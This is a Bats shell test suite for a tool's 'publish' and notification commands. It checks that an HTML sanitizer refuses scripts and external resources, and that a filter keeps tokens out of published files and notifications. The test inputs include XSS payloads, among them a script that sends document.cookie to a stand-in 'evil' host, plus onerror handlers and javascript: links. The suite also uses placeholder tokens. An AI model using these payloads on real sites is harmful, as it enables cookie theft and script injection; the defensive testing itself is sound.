#!/usr/bin/env bats

load helpers

setup() {
  ns_test_setup
  export GH_STUB_RESPONSES="$NS_REPO_ROOT/tests/fixtures/gh-stub/responses/desk"
  FIX="$BATS_TEST_TMPDIR/fixture"
  mkdir -p "$FIX/.claude"
  cat >"$FIX/.claude/project-profile.yaml" <<'EOF'
project: nightshift-sandbox
prefix: sbx
commands:
  setup: "true"
git: {}
stacks: [python]
EOF
  printf '# sandbox\n' >"$FIX/README.md"
  make_remote andras-tkcs/nightshift-sandbox "$FIX"
  "$NS_REPO_ROOT/bin/ns" project add andras-tkcs/nightshift-sandbox --prefix sbx >/dev/null
  "$NS_REPO_ROOT/bin/ns" new sbx-12 --tier T1 --yes >/dev/null
  WT="$NS_CODING_DIR/worktrees/nightshift-sandbox-sbx-12"
  LEDGER="$WT/.nightshift/runs/sbx-12/ledger.yaml"
  RUNDIR="$WT/.nightshift/runs/sbx-12"
  DESK="$NS_DESK_DIR/nightshift-sandbox"
  printf '# Plan\n\nDo the thing.\n' >"$RUNDIR/plan.md"
}

ns() { "$NS_REPO_ROOT/bin/ns" "$@"; }

tok() { printf 'ghp_%s' "abcdefghijklmnopqrstuvwxyz0123456789"; }

# refused <printf %b text>: publishing it as x.html fails with the R-DSK-2 message and copies nothing
refused() {
  printf '%b' "$1" >"$RUNDIR/x.html"
  run ns publish sbx-12 RUN/x.html
  assert_failure 1
  assert_output_contains "x.html: HTML must be self-contained (no scripts, no external resources)"
  [ ! -e "$DESK/runs/sbx-12/x.html" ]
}

# published <printf %b text>: publishing it as x.html succeeds and the file is on the desk
published() {
  printf '%b' "$1" >"$RUNDIR/x.html"
  run ns publish sbx-12 RUN/x.html
  assert_success
  [ -f "$DESK/runs/sbx-12/x.html" ]
}

@test "publishing copies the file with mode 0640, records .published and index.md" {
  run ns publish sbx-12 RUN/plan.md:plan.md
  assert_success
  f="$DESK/runs/sbx-12/plan.md"
  [ "$(stat -c %a "$f")" = 640 ]
  cmp "$f" "$RUNDIR/plan.md"
  sum=$(sha256sum "$f" | awk '{print $1}')
  printf 'plan.md\t.nightshift/runs/sbx-12/plan.md\t%s\n' "$sum" >"$BATS_TEST_TMPDIR/want"
  cmp "$DESK/runs/sbx-12/.published" "$BATS_TEST_TMPDIR/want"
  grep -q '^# nightshift-sandbox runs$' "$DESK/index.md"
  grep -q '^Updated 2026-10-02T21:00:00Z by ns publish\.$' "$DESK/index.md"
  grep -qF '| sbx-12 | T1 | ' "$DESK/index.md"
  grep -qF '[plan.md](runs/sbx-12/plan.md) |' "$DESK/index.md"
}

@test "republishing replaces the line and keeps the others" {
  printf 'a: 1\n' >"$RUNDIR/other.yaml"
  ns publish sbx-12 RUN/plan.md RUN/other.yaml
  printf '# Plan 2\n' >"$RUNDIR/plan.md"
  run ns publish sbx-12 RUN/plan.md
  assert_success
  [ "$(grep -c '^plan.md' "$DESK/runs/sbx-12/.published")" = 1 ]
  [ "$(wc -l <"$DESK/runs/sbx-12/.published")" = 2 ]
  sum=$(sha256sum "$DESK/runs/sbx-12/plan.md" | awk '{print $1}')
  grep -q "^plan.md.*$sum\$" "$DESK/runs/sbx-12/.published"
  grep -qF '[other.yaml](runs/sbx-12/other.yaml)' "$DESK/index.md"
}

@test "HTML with an external script is refused" {
  printf '<html><script src="https://x"></script></html>\n' >"$RUNDIR/r.html"
  run ns publish sbx-12 RUN/r.html
  assert_failure 1
  assert_output_contains "r.html: HTML must be self-contained (no scripts, no external resources)"
  [ ! -e "$DESK/runs/sbx-12/r.html" ]
}

@test "HTML with an external stylesheet or @import is refused" {
  printf '<link rel="stylesheet" href="https://x/a.css">\n' >"$RUNDIR/a.html"
  run ns publish sbx-12 RUN/a.html
  assert_failure 1
  printf '<style>@import url(x.css);</style>\n' >"$RUNDIR/b.html"
  run ns publish sbx-12 RUN/b.html
  assert_failure 1
}

@test "HTML with an inline style only is published" {
  printf '<html><style>p{color:red}</style><p>hi</p></html>\n' >"$RUNDIR/r.html"
  run ns publish sbx-12 RUN/r.html
  assert_success
  [ -f "$DESK/runs/sbx-12/r.html" ]
}

@test "issue #5 bypass a: protocol-relative link href is refused" {
  refused '<link rel=stylesheet href=//evil/x.css>\n'
}

@test "issue #5 bypass b: script with src on the next line is refused" {
  refused '<script\nsrc="https://x"></script>\n'
}

@test "issue #5 bypass c: img with an https src is refused" {
  refused '<img src="https://x">\n'
}

@test "issue #5 bypass d: inline script is refused" {
  refused '<script>fetch("https://evil/?"+document.cookie)</script>\n'
}

@test "link with href on the next line is refused" {
  refused '<link\nhref="https://x/a.css">\n'
}

@test "uppercase SCRIPT is refused" {
  refused '<SCRIPT>alert(1)</SCRIPT>\n'
}

@test "single-quoted protocol-relative src is refused" {
  refused "<img src='//x'>\n"
}

@test "unquoted http src is refused" {
  refused '<img src=http://x>\n'
}

@test "an onerror handler is refused" {
  refused '<img src="data:image/png;base64,AA==" onerror="fetch(1)">\n'
}

@test "a remote CSS url() is refused" {
  refused '<p style="background:url(//x)">hi</p>\n'
}

@test "a quoted > does not end the tag early" {
  refused '<svg><image title=">" href=//x/></svg>\n'
}

@test "a handler right after a closing quote is refused" {
  refused '<img src="data:image/png;base64,AA=="onerror="fetch(1)">\n'
}

@test "a handler after a stray quote is refused" {
  refused '<img src=data:x title=a"b onerror=fetch(1)>\n'
}

@test "svg href and xlink:href are refused" {
  refused '<svg><image href="https://x"/></svg>\n'
  refused '<svg><use xlink:href="//x#a"/></svg>\n'
}

@test "srcset, meta refresh and javascript: are refused" {
  refused '<img srcset="a.png 1x, https://x 2x">\n'
  refused '<meta http-equiv="refresh" content="0;url=https://x">\n'
  refused '<a href="javascript:alert(1)">x</a>\n'
}

@test "a file with a NUL byte is refused" {
  refused '<p>a\0b</p>\n'
}

@test "inline style, a data: image and an a href link are published" {
  published '<style>p{color:red}</style><img src="data:image/png;base64,iVBORw0KGgo="><p><a href="https://github.com/o/r/pull/1">PR</a></p>\n'
}

@test "prose with = and a bare URL is published" {
  published '<p>one = two, see https://x and say "onclick = no"</p>\n'
}

@test "the filled handoff template passes the check" {
  sed 's#{{PR_URL}}#https://github.com/o/r/pull/1#g' \
    "$NS_REPO_ROOT/plugins/ns/skills/handoff-report/template.html" >"$BATS_TEST_TMPDIR/h.html"
  # shellcheck source=/dev/null
  source "$NS_REPO_ROOT/bin/lib/desk.sh"
  run ns_desk_check_html "$BATS_TEST_TMPDIR/h.html"
  assert_success
}

@test "a file containing a token is refused" {
  printf 'key %s\n' "$(tok)" >"$RUNDIR/plan.md"
  run ns publish sbx-12 RUN/plan.md
  assert_failure 1
  assert_output_contains "plan.md: looks like it contains a token; not published"
  [ ! -e "$DESK/runs/sbx-12/plan.md" ]
}

@test "a bad name is refused" {
  run ns publish sbx-12 "RUN/plan.md:bad name.md"
  assert_failure 1
  [ ! -e "$DESK/runs/sbx-12/bad name.md" ]
}

@test "a path outside the worktree is refused" {
  printf 'x\n' >"$BATS_TEST_TMPDIR/outside.md"
  run ns publish sbx-12 "$BATS_TEST_TMPDIR/outside.md"
  assert_failure 1
  run ns publish sbx-12 RUN/../../../../outside.md
  assert_failure 1
}

@test "ns-github.env is accepted as a name" {
  printf 'REQUIRED_CHECKS=ci\n' >"$RUNDIR/x.txt"
  run ns publish sbx-12 RUN/x.txt:ns-github.env
  assert_success
  [ -f "$DESK/runs/sbx-12/ns-github.env" ]
}

@test "a missing desk root fails" {
  rm -rf "$NS_DESK_DIR"
  run ns publish sbx-12 RUN/plan.md
  assert_failure 1
  assert_output_contains "desk $NS_DESK_DIR not found: run bootstrap.sh or set NS_DESK_DIR"
}

@test "publishing at a gate notifies with the desk URL" {
  export NS_NTFY_TOPIC=topic1 NS_DESK_URL=https://desk.example
  ns-ledger state "$LEDGER" waiting --gate 1
  run ns publish sbx-12 RUN/plan.md
  assert_success
  grep -qF 'Click: https://desk.example/nightshift-sandbox/runs/sbx-12/plan.md' "$NS_STUB_LOG"
  grep -qF 'sbx-12: gate 1 needs you' "$NS_STUB_LOG"
  grep -qF 'https://ntfy.sh/topic1' "$NS_STUB_LOG"
}

@test "publishing without a gate says how many documents" {
  export NS_NTFY_TOPIC=topic1
  run ns publish sbx-12 RUN/plan.md
  assert_success
  grep -qF 'sbx-12: 1 document(s) published' "$NS_STUB_LOG"
  ! grep -q 'Click:' "$NS_STUB_LOG"
}

@test "ns-notify without a topic exits 0 and sends nothing" {
  run ns-notify "hello"
  assert_success
  assert_output_contains "ns-notify: NS_NTFY_TOPIC is not set; not sent"
  ! grep -q '^curl' "$NS_STUB_LOG"
}

@test "ns-notify with the wrong argument count is a usage error" {
  run ns-notify
  assert_failure 2
}

@test "ns-notify refuses a token in the text" {
  export NS_NTFY_TOPIC=topic1
  run ns-notify "oops $(tok)"
  assert_failure 1
  assert_output_contains "ns-notify: refusing to send something that looks like a token"
  ! grep -q '^curl' "$NS_STUB_LOG"
}

@test "ns-notify cuts the text to 200 characters" {
  export NS_NTFY_TOPIC=topic1
  long=$(printf 'a%.0s' $(seq 1 300))
  run ns-notify "$long"
  assert_success
  grep -qE -- "(-d|--data-raw) a{200} " "$NS_STUB_LOG"
  ! grep -qE -- "a{201}" "$NS_STUB_LOG"
}

@test "ns-notify fails when curl fails" {
  export NS_NTFY_TOPIC=topic1 CURL_STUB_EXIT=7
  run ns-notify "hello"
  assert_failure 1
  assert_output_contains "ns-notify: could not reach ntfy"
}

@test "ns-notify sends text starting with @ literally (issue 7)" {
  export NS_NTFY_TOPIC=topic1
  run ns-notify "@/some/file"
  assert_success
  grep -qF -- '--data-raw @/some/file' "$NS_STUB_LOG"
  ! grep '^curl ' "$NS_STUB_LOG" | grep -qE -- '(^| )-d '
}

@test "ns-notify passes the ntfy token via stdin or a file, never argv" {
  export NS_NTFY_TOPIC=topic1
  mkdir -p "$NS_CONFIG_DIR/tokens"
  printf 'tk_secrettoken123\n' >"$NS_CONFIG_DIR/tokens/ntfy"
  run ns-notify "hello"
  assert_success
  grep -qE '^curl-(stdin|file) .*Authorization: Bearer tk_secrettoken123' "$NS_STUB_LOG"
  ! grep '^curl ' "$NS_STUB_LOG" | grep -q tk_secrettoken123
  ! grep -q tk_secrettoken123 <<<"$output"
}

@test "ns-notify without a token file sends no Authorization header" {
  export NS_NTFY_TOPIC=topic1
  run ns-notify "hello"
  assert_success
  ! grep -qi 'Authorization' "$NS_STUB_LOG"
}

@test "ns-notify uses NS_NTFY_URL" {
  export NS_NTFY_TOPIC=topic1 NS_NTFY_URL=https://ntfy.example:8444
  run ns-notify "hello"
  assert_success
  grep -qF 'https://ntfy.example:8444/topic1' "$NS_STUB_LOG"
}

@test "ns-notify fails on a non-2xx answer and keeps the token out of the output" {
  export NS_NTFY_TOPIC=topic1 CURL_STUB_HTTP_CODE=403
  mkdir -p "$NS_CONFIG_DIR/tokens"
  printf 'tk_secrettoken123\n' >"$NS_CONFIG_DIR/tokens/ntfy"
  run ns-notify "hello"
  assert_failure 1
  assert_output_contains "ns-notify:"
  ! grep -q tk_secrettoken123 <<<"$output"
}

@test "publishing at gate 1.5 puts the escalation question in the notification (ns-47)" {
  export NS_NTFY_TOPIC=topic1 NS_DESK_URL=https://desk.example
  ns-ledger state "$LEDGER" waiting --gate 1.5
  printf '# Escalation\n\n## Question\n\nShould beta drop the cache?\n\n## Options\n\n- a\n' >"$RUNDIR/escalation.md"
  run ns publish sbx-12 RUN/plan.md
  assert_success
  grep -qF 'sbx-12: gate 1.5 needs you: Should beta drop the cache?' "$NS_STUB_LOG"
}

@test "ns desk import lands a desk note in the repo via a PR, never merged (ns-76)" {
  mkdir -p "$DESK/notes"
  printf '# Idea\n' >"$DESK/notes/idea.md"
  run ns desk import nightshift-sandbox/notes/idea.md docs/idea.md
  assert_success
  grep -q "pr create --repo andras-tkcs/nightshift-sandbox" "$GH_STUB_LOG"
  ! grep -q 'pr merge' "$GH_STUB_LOG"
  remote="$GH_STUB_REMOTES/andras-tkcs/nightshift-sandbox.git"
  br=$(git -C "$remote" for-each-ref --format='%(refname:short)' refs/heads | grep -v '^main$' | grep -v '^plan/' | head -1)
  [ -n "$br" ]
  [ "$(git -C "$remote" show "$br:docs/idea.md")" = "# Idea" ]
}

@test "ns desk import refuses absolute and .. repo paths and missing notes" {
  mkdir -p "$DESK/notes"
  printf '# Idea\n' >"$DESK/notes/idea.md"
  run ns desk import nightshift-sandbox/notes/idea.md /etc/x.md
  assert_failure
  run ns desk import nightshift-sandbox/notes/idea.md ../x.md
  assert_failure
  run ns desk import nightshift-sandbox/notes/missing.md docs/x.md
  assert_failure
  ! grep -q 'pr create' "$GH_STUB_LOG"
  run ns desk import nightshift-sandbox/notes/idea.md docs/ok.md
  assert_success
}

desk_leftovers() {
  local co="$NS_CODING_DIR/nightshift-sandbox"
  [ -z "$(git -C "$co" branch --list 'nightshift/desk-*')" ]
  [ -z "$(find "$NS_CODING_DIR/worktrees" -maxdepth 1 -name '*desk-*')" ]
}

@test "ns desk import cleans up when git push fails (ns-95)" {
  mkdir -p "$DESK/notes"
  printf '# Idea\n' >"$DESK/notes/idea.md"
  hook="$GH_STUB_REMOTES/andras-tkcs/nightshift-sandbox.git/hooks/pre-receive"
  printf '#!/bin/sh\nexit 1\n' >"$hook"
  chmod +x "$hook"
  run ns desk import nightshift-sandbox/notes/idea.md docs/idea.md
  assert_failure
  assert_output_contains "could not push"
  ! grep -q 'pr create' "$GH_STUB_LOG"
  desk_leftovers
}

@test "ns desk import cleans up when gh pr create fails (ns-95)" {
  mkdir -p "$DESK/notes"
  printf '# Idea\n' >"$DESK/notes/idea.md"
  mkdir -p "$BATS_TEST_TMPDIR/resp"
  printf '1\t-\t^pr create\n' >"$BATS_TEST_TMPDIR/resp/map"
  GH_STUB_RESPONSES="$BATS_TEST_TMPDIR/resp" run ns desk import nightshift-sandbox/notes/idea.md docs/idea.md
  assert_failure
  assert_output_contains "gh pr create failed"
  desk_leftovers
}
